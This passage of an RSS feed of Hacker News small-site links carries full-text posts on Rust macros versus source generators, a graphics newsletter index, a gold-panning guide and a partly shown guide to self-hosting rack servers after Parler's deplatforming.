the seat is a basic cuboid and recessed anchoring points for attaching legs at
its bottom, and an anchoring point for the back. More complex formulas could be
used used to specify the object or we could leave it open for inclusion of
hand-drawn objects in some IDE such as the ones provided by classic CAD
tools. This would be similar to the way Verilog/VHDL enable including
parts/components/libraries which are "hand drawn" to a ‚Ä¶</p></div></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.karimyaghmour.com/blog/2021/02/cadgol-a-cad-native-modeling-language.html">https://www.karimyaghmour.com/blog/2021/02/cadgol-a-cad-native-modeling-language.html</a></em></p>]]>
            </description>
            <link>https://www.karimyaghmour.com/blog/2021/02/cadgol-a-cad-native-modeling-language.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26135019</guid>
            <pubDate>Sun, 14 Feb 2021 18:57:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[For the Love of Macros]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26134929">thread link</a>) | @mbrubeck
<br/>
February 14, 2021 | https://matklad.github.io/2021/02/14/for-the-love-of-macros.html | <a href="https://web.archive.org/web/*/https://matklad.github.io/2021/02/14/for-the-love-of-macros.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <article>
  
  <p>Feb 14, 2021</p>
  <div id="preamble">
<div>
<p>I‚Äôve been re-reading Ted Kaminski blog about software design.
I highly recommend all the posts, especially the earlier ones
(here‚Äôs <a href="https://www.tedinski.com/2018/01/16/how-humans-write-programs.html">the first</a>).
He manages to offer design advice which is both non-trivial and sound (a subjective judgment of course), a rare specimen!</p>
<p>Anyway, one of the insights of the series is that, when designing an abstraction, we always face the inherent tradeoff between power and properties.
The more we can express using a particular abstraction, the less we can say about the code using it.
Our human bias for more expressive power is not inherent however.
This is evident in programming language communities, where users unceasingly ask for new features and language designers say no.</p>
<p>Macros are a language feature which is very far in the ‚Äúmore power‚Äù side of the chart.
Macros give you an ability to abstract over the source code.
In exchange, you give up the ability to (automatically) reason about the surface syntax.
As a specific <a href="https://rust-analyzer.github.io/blog/2020/03/30/macros-vs-rename.html">example</a>, rename refactoring doesn‚Äôt work 100% reliably in languages with powerful macro systems.</p>
<p>I do think that, in the ideal world, this is a wrong trade for a language which wants to scale to gigantic projects.
The ability to automatically reason about and transform source code gains in importance when you add more programmers, more years, and more millions of lines of code.
But take this with a huuuge grain of salt‚Äâ‚Äî‚ÄâI am obviously biased, having spent several years developing Rust IDEs.</p>
<p>That said, macros have a tremendous appeal‚Äâ‚Äî‚Äâthey are a language designer‚Äôs duct tape.
Macros are rarely the best tool for the job, but they can do almost any job.
The language design is incremental.
A macro system relives the design pressure by providing a ready poor man‚Äôs substitute for many features.</p>
<p>In this post, I want to explore what macros are used for in Rust.
The intention is to find solutions which do not give up the ‚Äúreasoning about source code‚Äù property.</p>
</div>
</div>
<div>
<h2 id="string-interpolation"><a href="#string-interpolation"></a>String Interpolation</h2>
<div>
<p>By far, the most common use-case is the <code>format!</code> family of macros.
The macro-less solution here is straightforward‚Äâ‚Äî‚Äâa string interpolation syntax:</p>
<div>
<div>
<pre><code data-lang="rust"><table><tbody><tr><td><pre>1
2
3
4
</pre></td><td><pre><span>let</span> <span>key</span> <span>=</span> <span>"number"</span><span>;</span>
<span>let</span> <span>value</span> <span>=</span> <span>||</span> <span>92</span><span>;</span>
<span>let</span> <span>f</span> <span>=</span> <span>f</span><span>"$key: ${values()}"</span><span>;</span>
<span>assert_eq!</span><span>(</span><span>t</span><span>.to_string</span><span>(),</span> <span>"number: 92"</span><span>);</span>
</pre></td></tr></tbody></table></code></pre>
</div>
</div>
<p>In Rust, interpolation probably shouldn‚Äôt construct a string directly.
Instead, it can produce a value implementing <code>Display</code> (just like <code>format_args!</code>), which can avoid allocations.
An interesting extension would be to allow iterating over format string pieces.
That way, the interpolation syntax could be used for things like SQL statements or command line arguments, without the fear of introducing injection vulnerabilities:</p>
<div>
<div>
<pre><code data-lang="rust"><table><tbody><tr><td><pre>1
2
3
</pre></td><td><pre><span>let</span> <span>arg</span> <span>=</span> <span>"my dir"</span><span>;</span>
<span>let</span> <span>cmd</span> <span>=</span> <span>f</span><span>"ls $arg"</span><span>.to_cmd</span><span>();</span>
<span>assert_eq!</span><span>(</span><span>cmd</span><span>.to_string</span><span>(),</span> <span>"ls 'my dir'"</span><span>);</span>
</pre></td></tr></tbody></table></code></pre>
</div>
</div>
<p><a href="https://julialang.org/blog/2012/03/shelling-out-sucks/">This post</a> about Julia programming language explains the issue.
<a href="https://github.com/matklad/xshell"><code>xshell</code></a> crate implements this idea for Rust.</p>
</div>
</div>
<div>
<h2 id="derives"><a href="#derives"></a>Derives</h2>
<div>
<p>I think the second most common, and probably the most important use of macros in Rust are derives.
Rust is one of the few languages which gets equality right (and forbids comparing apples and oranges), but this crucially depends on the ability to <code>derive(Eq)</code>.
Common solutions in this space are special casing in the compiler (Haskell‚Äôs <code>deriving</code>) or runtime reflection.</p>
<p>But the solution I am most excited about are C# <a href="https://devblogs.microsoft.com/dotnet/introducing-c-source-generators/">source generators</a>.
Which are nothing new‚Äâ‚Äî‚Äâthis is just the old (source) code generation, just with a nice quality of implementation.
You can supply custom code which gets run during the build and which can read existing sources and generate additional files, which are then added back to the compilation.</p>
<p>The beauty of this solution is that it moves all the complexity out of the language and into the build system.
This means that you get baseline tooling support for free.
Goto definition definition for generated code? Just works.
Want to step into some serialization code while debugging? There‚Äôs actual source code on disk, so feel free to!
You are more of a <code>printf</code> person? Well, you‚Äôd need to convince the build system to not stomp over your changes, but, otherwise, why not?</p>
<p>Additionally, source generators turn out to be significantly <em>more</em> expressive.
They can call into the Roslyn compiler to analyzer the source code, so they are capable of type-directed code generation.</p>
<p>To be useful, source generators require some language level support for splitting a single entity across several files.
In C#, partial classes play this role.</p>
</div>
</div>
<div>
<h2 id="domain-specific-languages"><a href="#domain-specific-languages"></a>Domain Specific Languages</h2>
<div>
<p>The raison d‚Äô√™tre of macros is implementation of embedded DSLs.
We want to introduce custom syntax within the language for succinctly modeling the program‚Äôs domain.
For example, a macro can be used to embed HTML fragments in Rust code.</p>
<p>To me personally, eDSL is not problem to be solved, but just a problem.
Introducing a new sublanguage (even if small) spends a lot of cognitive complexity budget.
If you need it once in a while, better stick to just chaining together somewhat verbose function calls.
If you need it a lot, it makes sense to introduce external DSL, with a compiler, a language server, and all the tooling that makes programming productive.
To me, macro-based DSLs just don‚Äôt fell like an interesting point on the cost-benefit curve.</p>
<p>That being said, the Kotlin programming language solves the problem of strongly-typed, tooling-friendly DSL nicely (<a href="https://kotlinlang.org/docs/type-safe-builders.html#how-it-works">example</a>).
Infuriatingly, it‚Äôs hard to point what <em>specifically</em> is the solution.
It‚Äôs ‚Ä¶‚Äã just the concrete syntax mostly.
Here are some ingredients:</p>
<div>
<ul>
<li>
<p>The syntax for closures is <code>{ arg -&gt; body }</code>, or just <code>{ body }</code>, so closures syntactically resemble blocks.</p>
</li>
<li>
<p>Extension methods (which are just sugar for static methods).</p>
</li>
<li>
<p>Java style implicit <code>this</code>, which introduces names into scope without an explicit declaration.</p>
</li>
<li>
<p><a href="https://boats.gitlab.io/blog/post/the-problem-of-effects/">TCP-preserving</a> inline closures (this the single non-syntactical feature)</p>
</li>
</ul>
</div>
<p>Nonetheless, this was not enough to implement Jetpack Compose UI DSL, it also needs a compiler plugin.</p>
</div>
</div>
<div>
<h2 id="sqlx"><a href="#sqlx"></a>sqlx</h2>
<div>
<p>An interesting case of a DSL I want to call out is <a href="https://docs.rs/sqlx/0.5.1/sqlx/macro.query.html"><code>sqlx::query</code></a>.
It allows one to write code like this:</p>
<div>
<div>
<pre><code data-lang="rust"><table><tbody><tr><td><pre>1
2
3
4
5
6
7
8
</pre></td><td><pre><span>let</span> <span>account</span> <span>=</span>
  <span>sqlx</span><span>::</span><span>query!</span><span>(</span><span>"select (1) as id, 'Herp Derpinson' as name"</span><span>)</span>
    <span>.fetch_one</span><span>(</span><span>&amp;</span><span>mut</span> <span>conn</span><span>)</span>
    <span>.await</span><span>?</span><span>;</span>

<span>// anonymous struct has `#[derive(Debug)]` for convenience</span>
<span>println!</span><span>(</span><span>"{:?}"</span><span>,</span> <span>account</span><span>);</span>
<span>println!</span><span>(</span><span>"{}: {}"</span><span>,</span> <span>account</span><span>.id</span><span>,</span> <span>account</span><span>.name</span><span>);</span>
</pre></td></tr></tbody></table></code></pre>
</div>
</div>
<p>This I think is one of the few cases where eDSL does really pull its weight.
I don‚Äôt know how to do this without macros.
Using string interpolation (the advanced version to protect from injection), it is possible to specify the query.
Using a source generator, it is possible to check the syntax of the query and verity the types, to, eg, raise a type error in this case:</p>
<div>
<div>
<pre><code data-lang="rust"><table><tbody><tr><td><pre>1
2
3
4
</pre></td><td><pre><span>let</span> <span>(</span><span>id</span><span>,</span> <span>name</span><span>):</span> <span>(</span><span>i32</span><span>,</span> <span>f32</span><span>)</span> <span>=</span>
  <span>query</span><span>(</span><span>"select (1) as id, 'Herp Derpinson' as name"</span><span>)</span>
    <span>.fetch_one</span><span>(</span><span>&amp;</span><span>mut</span> <span>conn</span><span>)</span>
    <span>.await</span><span>?</span><span>;</span>
</pre></td></tr></tbody></table></code></pre>
</div>
</div>
<p>But this won‚Äôt be enough to generate an anonymous struct, or to get rid of dynamic casts.</p>
</div>
</div>
<div>
<h2 id="conditional-compilation"><a href="#conditional-compilation"></a>Conditional Compilation</h2>
<div>
<p>Rust also uses macros for conditional compilation.
This use case convincingly demonstrates ‚Äúlack of properties‚Äù aspect of power.
Dealing with feature combinations is a perpetual headache for Cargo.
Users have to repeatedly recompile large chunks of the crate graph when feature flags change.
Catching a type error on CI with <code>cargo test --no-default-features</code> is pretty annoying, especially if you did run <code>cargo test</code> before submitting a PR.
‚ÄúAdditive Features‚Äù is an uncheckable wishful thinking.</p>
<p>In this case, I don‚Äôt know a good macro-less alternative.
But, in principle, this seems doable, if conditional compilation is pushed further down the compiler pipeline, to the code generation and linking stage.
Rather than discarding some code early during parsing, the compiler can select the platform-specific version just before producing machine code for a function.
Before that, it checks that all conditionally-compiled versions of the function have the same interface.
That way, platform-specific type errors are impossible.</p>
</div>
</div>
<div>
<h2 id="placeholder-syntax"><a href="#placeholder-syntax"></a>Placeholder Syntax</h2>
<div>
<p>The final use-case I want to cover is that of a placeholder syntax.
Rust‚Äôs <code>macro_call!(‚Ä¶‚Äã)</code> syntax carves a well-isolated region where anything goes, syntax wise, as long as the parenthesis are balanced.
In theory, this allow language designers to experiment with provisional syntax before setting something in stone.
In practice, it looks like this is not at all that beneficial?
There was some opposition to stabilizing postfix <code>.await</code> without going via intermediate period with <code>await!</code> macro.
And, after stabilization, all <em>syntax</em> discussions were immediately forgotten?
On the other hand, we did have <code>try! -&gt; ?</code> transition, and I don‚Äôt think it helped to uncover any design pitfalls?
At least, we managed to stabilize the <a href="https://internals.rust-lang.org/t/can-try-and-use-the-into-trait-instead-of-from/6714">unnecessary restrictive</a> desugaring on that one.</p>
<hr>
<p>For conclusion, I want to circle back to source generators.
What <em>exactly</em> makes them easier for tooling than macros?
I think the following three properties do.
<em>First</em>, both input and output is, fundamentally, text.
There‚Äôs no intermediate representation (like token trees), which is used by this meta-programming facility.
This means that it doesn‚Äôt need to be integrated deeply with the compiler.
Of course, internally the tool is free to parse, typecheck and transform the code however it likes.
<em>Second</em>, there is a phase distinction.
Source generators are executed once, in unordered fashion.
There‚Äôs no back and forth between meta programming and name resolution, which, again, allows to keep ‚Äúmeta‚Äù part outside.
<em>Third</em>, source generators can only add code, they can not change the meaning of the existing code.
This means that semantically sound source code transformations remains so in the presence of a code generator.</p>
<p>That‚Äôs all!
Discussion on <a href="https://old.reddit.com/r/rust/comments/ljnkwg/blog_post_for_the_love_of_macros/">/r/rust</a>.</p>
</div>
</div>
</article>

  </div></div>]]>
            </description>
            <link>https://matklad.github.io/2021/02/14/for-the-love-of-macros.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26134929</guid>
            <pubDate>Sun, 14 Feb 2021 18:46:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Graphics Programming Weekly]]>
            </title>
            <description>
<![CDATA[
Score 160 | Comments 27 (<a href="https://news.ycombinator.com/item?id=26134854">thread link</a>) | @E-Reverance
<br/>
February 14, 2021 | https://www.jendrikillner.com/tags/weekly/ | <a href="https://web.archive.org/web/*/https://www.jendrikillner.com/tags/weekly/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

  

  

  
  
  <div>
    <h2><a href="https://www.jendrikillner.com/post/graphics-programming-weekly-issue-170/">Graphics Programming weekly - Issue 170 ‚Äî February 14, 2021</a></h2>
    <p>
      
      Summary of articles of the week of February 14, 2021.
      
    </p>
  </div>
  
  <div>
    <h2><a href="https://www.jendrikillner.com/post/graphics-programming-weekly-issue-169/">Graphics Programming weekly - Issue 169 ‚Äî February 7, 2021</a></h2>
    <p>
      
      Summary of articles of the week of February 7, 2021.
      
    </p>
  </div>
  
  <div>
    <h2><a href="https://www.jendrikillner.com/post/graphics-programming-weekly-issue-168/">Graphics Programming weekly - Issue 168 ‚Äî January 31, 2021</a></h2>
    <p>
      
      Summary of articles of the week of January 31, 2021.
      
    </p>
  </div>
  
  <div>
    <h2><a href="https://www.jendrikillner.com/post/graphics-programming-weekly-issue-167/">Graphics Programming weekly - Issue 167 ‚Äî January 24, 2021</a></h2>
    <p>
      
      Summary of articles of the week of January 24, 2021.
      
    </p>
  </div>
  
  <div>
    <h2><a href="https://www.jendrikillner.com/post/graphics-programming-weekly-issue-166/">Graphics Programming weekly - Issue 166 ‚Äî January 17, 2021</a></h2>
    <p>
      
      Summary of articles of the week of January 17, 2021.
      
    </p>
  </div>
  
  <div>
    <h2><a href="https://www.jendrikillner.com/post/graphics-programming-weekly-issue-165/">Graphics Programming weekly - Issue 165 ‚Äî January 10, 2021</a></h2>
    <p>
      
      Summary of articles of the week of January 10, 2021.
      
    </p>
  </div>
  
  <div>
    <h2><a href="https://www.jendrikillner.com/post/graphics-programming-weekly-issue-164/">Graphics Programming weekly - Issue 164 ‚Äî January 3, 2021</a></h2>
    <p>
      
      Summary of articles of the week of January 3, 2021.
      
    </p>
  </div>
  
  <div>
    <h2><a href="https://www.jendrikillner.com/post/graphics-programming-weekly-issue-163/">Graphics Programming weekly - Issue 163 ‚Äî December 27, 2020</a></h2>
    <p>
      
      Summary of articles of the week of December 27, 2020.
      
    </p>
  </div>
  
  <div>
    <h2><a href="https://www.jendrikillner.com/post/graphics-programming-weekly-issue-162/">Graphics Programming weekly - Issue 162 ‚Äî December 20, 2020</a></h2>
    <p>
      
      Summary of articles of the week of December 20, 2020.
      
    </p>
  </div>
  
  <div>
    <h2><a href="https://www.jendrikillner.com/post/graphics-programming-weekly-issue-161/">Graphics Programming weekly - Issue 161 ‚Äî December 13, 2020</a></h2>
    <p>
      
      Summary of articles of the week of December 13, 2020.
      
    </p>
  </div>
  

  
<nav>
  <ul>
    
    
    <li><a href="https://www.jendrikillner.com/tags/weekly/page/2/">Next ¬ª</a></li>
    
  </ul>
</nav>



</div></div>]]>
            </description>
            <link>https://www.jendrikillner.com/tags/weekly/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26134854</guid>
            <pubDate>Sun, 14 Feb 2021 18:38:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Pan for Real Gold at Cornwall Gold]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26134812">thread link</a>) | @jpcooper
<br/>
February 14, 2021 | https://www.cornwall-gold.com/how-to-pan-for-real-gold-at-cornwall-gold/ | <a href="https://web.archive.org/web/*/https://www.cornwall-gold.com/how-to-pan-for-real-gold-at-cornwall-gold/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">
    	<div>

        
            <div>                <div>
	<div id="primary">
		<main id="main" role="main">

		        
<article id="post-5349">
	<!-- .entry-header -->

	<div>
		<p>Come and learn how to pan for real gold at Cornwall Gold!</p>
<p>We were recently visited by the World Gold Panning Champion, James Linnett, and another professional gold panner, Teddy from <a href="https://www.facebook.com/AandTadventures/">A &amp; T Adventures</a>. They both had a ‚Äòpan-off‚Äô in our <a href="https://www.cornwall-gold.com/our-world/family-fun/">gold panning troughs</a> and decided to leave some of their real gold in there for YOU to find!</p>
<p>The gold they left in our panning troughs is beautiful native gold that they found in some wild Scottish rivers. It‚Äôs very special gold which is worth 3-4 times as much as the gold you would find in your average jewellery.</p>
<p>Best of all, gold panning is FREE at Cornwall Gold, so pop along and give it a try!</p>

<h4>How to pan for real gold at Cornwall Gold, step-by-step:</h4>
<p>To give you a head start, we thought we should show you how to pan for gold.</p>
<ol>
<li>Collect your gold pan and scoop into it a good couple of handfuls of sand from our panning troughs.</li>
<li>Hold the pan with the ridges in it at the front. Submerge the sand in the pan under the water. Agitate it vigorously from side to side. Don‚Äôt worry about losing your gold at this point. Gold is heavier than the sand and so it will sink to the bottom.</li>
<li>Tilt the forward edge of your pan downwards slightly and swoosh it backwards and forwards gently. This allows the sand on the surface to be gradually washed out a little at a time.</li>
<li>Carry on with this process until the sand has nearly gone and you can see your gold at the bottom of the pan!</li>
</ol>
<p><img src="https://www.cornwall-gold.com/wp-content/uploads/2019/09/Pan-450x600.jpg" alt="real gold in a gold pan" width="450" height="600" srcset="https://www.cornwall-gold.com/wp-content/uploads/2019/09/Pan-600x800.jpg 350w, https://www.cornwall-gold.com/wp-content/uploads/2019/09/Pan-450x600.jpg 1000w" sizes="(max-width: 768px) 100vw, 450px"></p>
<h4>How do you know if you have found real gold?</h4>
<p>In our panning troughs is also ‚Äòfool‚Äôs gold‚Äô&nbsp; or iron pyrite. To tell if you have found our real gold just hold the pan in the light. If you put your finds into shadow (hold your hand over it) the fools gold will lose its brightness and look darker whereas real gold will retain its bright colour.</p>
<p><strong>Gold panning is free at Cornwall Gold. Free entry to the whole site, free parking, dog-friendly and fully accessible.</strong></p>
			</div><!-- .entry-content -->

	<!-- .entry-meta -->
    
    
        
		<nav role="navigation">
		
		<!-- .nav-links -->
	</nav><!-- .navigation -->
	</article><!-- #post-## -->

		
		</main><!-- #main -->
	</div><!-- #primary -->

	            </div><!-- close .row -->
            </div><!-- close .main-content-area -->
        </div><!-- close .site-content-wrapper -->
    </div></div>]]>
            </description>
            <link>https://www.cornwall-gold.com/how-to-pan-for-real-gold-at-cornwall-gold/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26134812</guid>
            <pubDate>Sun, 14 Feb 2021 18:33:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Parler‚Äôs epic fail: A crash course on running your own servers]]>
            </title>
            <description>
<![CDATA[
Score 108 | Comments 116 (<a href="https://news.ycombinator.com/item?id=26134691">thread link</a>) | @fireeyed
<br/>
February 14, 2021 | https://blog.alexgleason.me/run-your-own-server/ | <a href="https://web.archive.org/web/*/https://blog.alexgleason.me/run-your-own-server/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
    <div>

        <article>

            

            <figure>
                <img srcset="https://blog.alexgleason.me/content/images/size/w300/2021/02/poweredge.png 300w,
                            https://blog.alexgleason.me/content/images/size/w600/2021/02/poweredge.png 600w,
                            https://blog.alexgleason.me/content/images/size/w1000/2021/02/poweredge.png 1000w,
                            https://blog.alexgleason.me/content/images/size/w2000/2021/02/poweredge.png 2000w" sizes="(max-width: 800px) 400px,
                        (max-width: 1170px) 1170px,
                            2000px" src="https://blog.alexgleason.me/content/images/size/w2000/2021/02/poweredge.png" alt="Parler‚Äôs epic fail: A crash course on running your own servers with a shoestring budget">
            </figure>

            <section>
                <div>
                    <blockquote>First they came for the Communists,<br>and I didn‚Äôt speak up,<br>because I wasn‚Äôt a Communist.<br>Then they came for the Jews,<br>and I didn‚Äôt speak up,<br>because I wasn‚Äôt a Jew.<br>Then they came for the Catholics,<br>and I didn‚Äôt speak up,<br>because I was a Protestant.<br>Then they came for me,<br>and by that time there was no one<br>left to speak up for me.</blockquote><p>In the early days of 2021 we learned the true power of American tech companies. After Trump was ousted by Twitter, the social media alternative Parler was cut off by their cloud hosting provider, Amazon.</p><p>Where do we go from here? What can a freedom-minded person do to avoid censorship by tech oligarchs?</p><p>The only way is to meet them at their level. In some industries it's impossible to challenge the establishment, but anyone can have a voice on the Internet. This is still true in 2021.</p><h2 id="cloud-hosting-vs-real-computers">Cloud hosting vs real computers</h2><p>Cloud hosting has made it easy for anyone to run a website. It lowered the barrier of entry, improved tech literacy, and I wouldn't be where I am today without it. But it's time to cut out the middleman.</p><p>You can run a real server anywhere there's power and an internet connection. You can run a server from your home. You can run it from someone else's home. You can run it from a datacenter in an undisclosed location.</p><figure><img src="https://blog.alexgleason.me/content/images/2021/02/TPB_servers.jpg" alt="" srcset="https://blog.alexgleason.me/content/images/size/w600/2021/02/TPB_servers.jpg 600w, https://blog.alexgleason.me/content/images/2021/02/TPB_servers.jpg 800w" sizes="(min-width: 720px) 720px"><figcaption>Servers for The Pirate Bay at an undisclosed location.</figcaption></figure><p>It's true an ISP can censor, but it's a whole different playing field. You can find datacenters run by Conservative Boomers, Russians, porn companies, and principled free speech advocates. By the time it becomes a bigger problem, I'm sure some of us will be <a href="https://startyourownisp.com/">running our own ISP</a>, too.</p><p>It's a great ability to be able to pick up and move, plug in somewhere else, and continue to stay online. I argue that your chances of survival are much better this way, and Parler is foolish for not going this route. We can do better.</p><h2 id="getting-started-with-a-computer-on-your-home-internet">Getting started with a computer on your home internet</h2><p>Our mission is to run a high-availability production server in a datacenter. But first, we should should experiment with a server at home. Here's what you will need to achieve it:</p><ul><li>An internet connection</li><li>A computer running 24/7</li><li>A router that lets you configure port forwarding</li><li>Ethernet cables</li></ul><p>For higher availability, you may consider:</p><ul><li>Battery backup</li><li>Wireless 4G backup connection</li><li>Fiber-optic internet connection</li></ul><figure><img src="https://blog.alexgleason.me/content/images/2021/02/image.png" alt=""><figcaption>The 'first' Pirate Bay server, on display at the Computer Museum in Link√∂ping, Sweden.</figcaption></figure><p>Running a server at home is a good starting point. It could serve as a testing facility, production backup, or even serve a small online community. Chances are, you already have all the equipment needed.</p><p>Check out <a href="https://www.reddit.com/r/homelab/">/r/homelab</a> on Reddit for inspiration.</p><p>It is critical you have fast enough <strong>upload </strong>speeds if you're serving real users. Check out <a href="https://www.speedtest.net/">speedtest.net</a> to find out.</p><p>With upload speeds as low as 5 Mbps, you may be able to host an online community with 20,000 users. Keep in mind your video calls will compete for upload bandwidth on the home network.</p><p>If you score a fiber internet connection, that is really good, as it can give up to 1 Gbps <em>upload</em> speeds. That's quite literally datacenter levels of bandwidth at your home.</p><p>With this setup, you must be able to accept power outages and potential network failures. A battery backup and wireless internet backup can help with this.</p><p>Some people have taken this concept very far, building literal datacenters in their homes.</p><figure><img src="https://blog.alexgleason.me/content/images/2021/02/datacenter.jpg" alt="" srcset="https://blog.alexgleason.me/content/images/size/w600/2021/02/datacenter.jpg 600w, https://blog.alexgleason.me/content/images/2021/02/datacenter.jpg 800w" sizes="(min-width: 720px) 720px"><figcaption>Home datacenter by Qu√©bec, Canada IT Teacher <a href="https://ve2cuy.wordpress.com/my-home-data-center/">VE2CUY</a>.</figcaption></figure><p>To make your computer accessible from the outside world, you can configure a port forward in your router. This will allow users to visit your public IP address to access your home server. You may then accordingly set up some domain names for your public IP.</p><figure><img src="https://blog.alexgleason.me/content/images/2021/02/Screenshot-from-2021-02-10-14-12-38.png" alt="" srcset="https://blog.alexgleason.me/content/images/size/w600/2021/02/Screenshot-from-2021-02-10-14-12-38.png 600w, https://blog.alexgleason.me/content/images/size/w1000/2021/02/Screenshot-from-2021-02-10-14-12-38.png 1000w, https://blog.alexgleason.me/content/images/2021/02/Screenshot-from-2021-02-10-14-12-38.png 1011w" sizes="(min-width: 720px) 720px"><figcaption>My home router, forwarding ports 80 and 443 to my server's local IP.</figcaption></figure><p>Some ISPs offer expensive business plans that give you a static IP address, but I just used my dynamic IP. It seems to change rarely, if ever.</p><h2 id="obtaining-a-rack-server">Obtaining a rack server</h2><p>When running a home server isn't enough, you'll need to move into a datacenter.</p><p>Before getting into a datacenter, you'll need a computer than can fit into a standard rack. Rack servers are very similar to desktops, but come in a form factor of 1U, 2U, 3U, and 4U.</p><p>1U describes the height. 2U is the same height as two 1U servers, and so on. A typical rack at a datacenter is 42U, so it can fit fourty-two 1U servers, or twenty-one 2U. The depth of a server is also variable, but that doesn't really matter unless you're buying a rack. Servers are all the same width.</p><p>The server I chose is a <a href="https://downloads.dell.com/manuals/all-products/esuprt_ser_stor_net/esuprt_poweredge/poweredge-r720_reference-guide_en-us.pdf">Dell PowerEdge R720</a>, which I purchased for $450 off eBay. This 2U server has 32 vCores, 64 GB of RAM, and a RAID interface with 8 HDD slots.</p><figure><img src="https://blog.alexgleason.me/content/images/2021/02/586c2473c206a75b0fcf9ff210f3946c712b8c759aac11a72175aa3f4a72fe8b.jpeg" alt="" srcset="https://blog.alexgleason.me/content/images/size/w600/2021/02/586c2473c206a75b0fcf9ff210f3946c712b8c759aac11a72175aa3f4a72fe8b.jpeg 600w, https://blog.alexgleason.me/content/images/size/w1000/2021/02/586c2473c206a75b0fcf9ff210f3946c712b8c759aac11a72175aa3f4a72fe8b.jpeg 1000w, https://blog.alexgleason.me/content/images/2021/02/586c2473c206a75b0fcf9ff210f3946c712b8c759aac11a72175aa3f4a72fe8b.jpeg 1478w" sizes="(min-width: 720px) 720px"><figcaption>My Dell PowerEdge R720 connected to my home internet.</figcaption></figure><p>It connects to the wall with standard power cables. There are 4 Ethernet ports, two USB ports, and a VGA input for attaching a screen.</p><p>Note that it's a lot bigger than you think! Make sure you have space for it.</p><p>I chose a PowerEdge because they're beloved by hobbyists, and a lot of information exists about them online. My model is from 2012, which seems to be a sweet spot between power and affordability. These machines are built to last a very long time.</p><p>Other models from that era are equally good. For a 1U option, consider a PowerEdge R320. To understand the naming convention: the R stands for "rack", while the R3xx and R7xx are 1U and 2U products respectively. The <a href="https://www.dell.com/en-us/work/shop/dell-poweredge-servers/sc/servers/poweredge-rack-servers">newest PowerEdge models right now</a> are the R340 and R740.</p><p>You should run this server from your home internet at first, while you get things up and running.</p><h3 id="installing-hard-drives">Installing hard drives</h3><p>For obvious reasons, hard drives were not included. Right now, refurbished 4TB SATA HDDs have the best cost per Gigabyte. I bought some off Amazon. HGST brand is a good bet, as they are inexpensive refurbished Western Digital drives with a different label.</p><figure><img src="https://blog.alexgleason.me/content/images/2021/02/sata_vs_sas.jpg" alt="" srcset="https://blog.alexgleason.me/content/images/size/w600/2021/02/sata_vs_sas.jpg 600w, https://blog.alexgleason.me/content/images/2021/02/sata_vs_sas.jpg 1000w" sizes="(min-width: 720px) 720px"><figcaption>SATA drive on top, SAS on the bottom.</figcaption></figure><p>It's worth noting most servers support SAS drives also. SAS is an alternative to SATA with better reliability and a different performance profile. The connector in my R720 is actually a SAS connector, but SATA drives fit into them and work just fine.</p><p>I went with SATA for my build because of better price and availability. Just know it's an option, and don't mix and match them while doing RAID.</p><h3 id="differences-in-ram">Differences in RAM</h3><p>My PowerEdge uses DDR3 RDIMM memory. I should note that UDIMM and LDIMM are also options. Traditional desktop computers use UDIMM (unbuffered memory), while servers have an option between 3 different types. You must not mix different types in the same computer.</p><figure><img src="https://blog.alexgleason.me/content/images/2021/02/d6974031befa18427714fb894de3757f63efb945adfef013feee9ea8464cdd92.png" alt="" srcset="https://blog.alexgleason.me/content/images/size/w600/2021/02/d6974031befa18427714fb894de3757f63efb945adfef013feee9ea8464cdd92.png 600w, https://blog.alexgleason.me/content/images/size/w1000/2021/02/d6974031befa18427714fb894de3757f63efb945adfef013feee9ea8464cdd92.png 1000w, https://blog.alexgleason.me/content/images/size/w1600/2021/02/d6974031befa18427714fb894de3757f63efb945adfef013feee9ea8464cdd92.png 1600w, https://blog.alexgleason.me/content/images/size/w2400/2021/02/d6974031befa18427714fb894de3757f63efb945adfef013feee9ea8464cdd92.png 2400w" sizes="(min-width: 720px) 720px"><figcaption>Registered memory (RDIMM)</figcaption></figure><p>RDIMM (registered memory) is the most common type of memory for servers. Each stick contains an extra chip (a register) used to reduce load to the memory controller, letting your hardware last longer.</p><p>When upgrading RAM, you should also pay special attention to the <strong>rank</strong> of the memory. Rank is usually a number between 1 and 4. Your server has a maximum allowed rank per channel, so if the total rank is too high you might have to leave some slots empty.</p><h3 id="installing-an-os">Installing an OS</h3><p>For the OS, I cannot recommend <a href="https://www.proxmox.com/en/proxmox-ve">Proxmox VE</a> enough. It allows you to easily create virtual machines without much knowledge or pain.</p><figure><img src="https://blog.alexgleason.me/content/images/2021/02/Screenshot-from-2021-02-09-14-06-22.png" alt="" srcset="https://blog.alexgleason.me/content/images/size/w600/2021/02/Screenshot-from-2021-02-09-14-06-22.png 600w, https://blog.alexgleason.me/content/images/2021/02/Screenshot-from-2021-02-09-14-06-22.png 951w" sizes="(min-width: 720px) 720px"><figcaption>Proxmox VE running on my server.</figcaption></figure><p>I recommend this for a first server because of its flexibility, and you can always add bare metal nodes to the network later. All virtual machines appear as first-class citizens on the host network, so you can easily network them with physical nodes.</p><h3 id="further-learning">Further learning</h3><p>YouTube has been a godsend for helping me learn all this stuff and set it up. Here are a few recommendations:</p><ul><li><a href="https://www.youtube.com/watch?v=86KK_dZoCJ0">Manually Updating the Firmwares on a Dell PowerEdge R610</a> by Rob Willis</li><li><a href="https://www.youtube.com/watch?v=ck3gx9HB9-k&amp;list=PLSNNzog5eydtmcbcbc1b8pVRkgre3vNUy">Switching and Routing</a> by Sunny Classroom</li><li><a 